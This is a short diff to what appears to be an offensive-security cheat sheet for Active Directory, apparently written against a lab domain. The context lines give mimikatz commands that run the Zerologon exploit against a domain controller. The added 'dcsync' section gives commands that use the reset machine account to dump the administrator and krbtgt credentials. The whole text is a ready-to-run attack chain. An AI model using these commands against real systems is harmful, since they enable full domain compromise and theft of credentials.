@@ -97,3 +97,8 @@ Zerologon
     lsadump::Zerologon /target:192.168.177.19 /account:server2019$ /null /ntlm /exploit
     lsadump::postzerologon /target:192.168.177.19 /account:server2019$
 ![image](https://github.com/user-attachments/assets/07bd99c9-3e5b-417a-b4ce-33f5628990bd)
+dcsync
+---
+    lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:administrator
+lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:krbtgt
+
